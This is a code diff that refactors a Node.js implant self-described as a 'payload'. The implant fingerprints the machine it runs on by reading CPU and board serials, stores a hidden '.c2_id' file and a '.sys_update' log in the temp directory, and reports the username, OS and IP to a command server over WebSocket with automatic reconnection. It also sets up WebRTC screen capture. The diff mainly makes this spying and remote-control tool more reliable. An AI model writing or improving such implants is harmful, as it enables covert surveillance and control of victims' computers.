@@ -1,44 +1,28 @@
 const WebSocket = require('ws');
-const http = require('http'); // <--- ADDED FOR RENDER PORT LISTENING
+const http = require('http');
 const { execSync } = require('child_process');
 const os = require('os');
 const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
- 
-try {
- const nodeModulesPath = path.join(__dirname, 'node_modules', '@roamhq', 'wrtc');
- if (!fs.existsSync(nodeModulesPath)) {
- execSync('npm install @roamhq/wrtc --save', { stdio: 'pipe' });
- }
-} catch (e) {}
 
-let wrtc;
-try { wrtc = require('@roamhq/wrtc'); } catch (e) {}
-
-const { RTCPeerConnection, RTCSessionDescription, mediaDevices } = wrtc || {};
-
+// --- CONFIGURATION ---
+const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 
+const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
 const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
 const LOG_FILE = path.join(LOG_DIR, 'payload.log');
+
 if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
 
 function log(msg) {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] ${msg}`);
- fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`);
+ try { fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`); } catch(e) {}
 }
 
 log("[INIT] Payload starting...");
 
-// POINTS TO YOUR VERCEL SERVER
-const WS_URL = 'wss://server-eight-pi-39.vercel.app';
-
-let myId = null;
-let ws = null;
-let reconnectAttempts = 0;
-let isConnected = false;
-
-// --- HARDWARE FINGERPRINT GENERATION ---
+// --- HARDWARE FINGERPRINT ---
 function getHardwareFingerprint() {
  const mac = getMacAddress();
  const cpuSerial = getCpuSerial();
@@ -61,7 +45,7 @@ function getMacAddress() {
 function getCpuSerial() {
  try { return execSync('wmic cpu get processorid').toString().split('\n')[1].trim(); }
  catch (e) {
- try { return execSync('cat /proc/cpuinfo | grep Serial | awk \'{print $3}\'').toString().trim(); }
+ try { return execSync("cat /proc/cpuinfo | grep 'serial number' | awk '{print $3}'").toString().trim(); }
  catch (e2) { return 'unknown_cpu'; }
  }
 }
@@ -69,13 +53,13 @@ function getCpuSerial() {
 function getBoardSerial() {
  try { return execSync('wmic baseboard get serialnumber').toString().split('\n')[1].trim(); }
  catch (e) {
- try { return execSync('sudo dmidecode -t system | grep Serial | awk \'{print $3}\'').toString().trim(); }
+ try { return execSync("sudo dmidecode -t system | grep 'Serial Number' | awk '{print $3}'").toString().trim(); }
  catch (e2) { return 'unknown_board'; }
  }
 }
 
-// Try to load persistent ID from disk first
-const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
+// --- ID MANAGEMENT ---
+let myId = null;
 try {
  if (fs.existsSync(PERSIST_FILE)) {
  const savedId = fs.readFileSync(PERSIST_FILE, 'utf8').trim();
@@ -90,13 +74,15 @@ if (!myId) {
 
 log(`[ID] Hardware Fingerprint: ${myId}`);
 
-let peerConnection = null;
-let localStream = null;
+// --- WEBSOCKET CONNECTION WITH ROBUST RECONNECT ---
+let ws = null;
+let reconnectAttempts = 0;
+let isConnected = false;
+let myIp = 'Unknown';
 
 function initConnection() {
  log(`[WS] Attempting connection to ${WS_URL}...`);
 
- // Add error handler BEFORE connecting
  ws = new WebSocket(WS_URL);
 
  ws.on('error', (err) => {
@@ -107,14 +93,16 @@ function initConnection() {
  ws.on('open', () => {
  reconnectAttempts = 0;
  isConnected = true;
+ // Send info including the unique ID and Serial Number
  safeSend(JSON.stringify({
  type: 'info',
- id: myId, // <-- SEND AS 'id'
- uniqueId: myId, // <-- ALSO SEND AS 'uniqueId'
+ id: myId,
+ uniqueId: myId,
  os: os.platform(),
  arch: os.arch(),
- user: os.userInfo().username,
- ip: '127.0.0.1'
+ user: os.userInfo().username || 'user',
+ ip: myIp, 
+ serialNumber: myId 
  }));
  startMonitoring();
  });
@@ -126,13 +114,16 @@ function initConnection() {
  else if (data.type === 'offer') handleOffer(data.sdp);
  else if (data.type === 'answer') handleAnswer(data.sdp);
  else if (data.type === 'candidate') handleCandidate(data.candidate);
- } catch (e) {}
+ } catch (e) {
+ log(`[WS] Message parse error: ${e.message}`);
+ }
  });
 
- ws.on('close', () => {
+ ws.on('close', (code, reason) => {
  isConnected = false;
- log(`[WS] Closed. Reconnecting in 5s...`);
- setTimeout(initConnection, 5000);
+ log(`[WS] Closed. Code: ${code}. Reconnecting in ${(reconnectAttempts + 1) * 5}s...`);
+ setTimeout(initConnection, Math.min((reconnectAttempts + 1) * 5000, 30000));
+ reconnectAttempts++;
  });
 }
 
@@ -145,6 +136,10 @@ function startMonitoring() {
  if (isConnected) safeSend(JSON.stringify({ type: 'heartbeat' }));
  }, 30000);
 }
+
+// --- WEBRTC (BROWSER NATIVE) ---
+let peerConnection = null;
+let localStream = null;
 
 async function captureScreenPureJS() {
  if (!peerConnection) {
@@ -194,8 +189,8 @@ function handleCandidate(candidate) {
  if (peerConnection && candidate) peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(err => log(`[WEBRTC] Candidate error: ${err.message}`));
 }
 
-// --- START HTTP PORT LISTENER FOR RENDER ---
-const PORT = Number(process.env.PORT) || 10000;
+// --- HTTP PORT LISTENER (For Render Health) ---
+const PORT = Number(process.env.PORT) || 3000;
 const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ status: 'ok', service: 'payload', id: myId }));
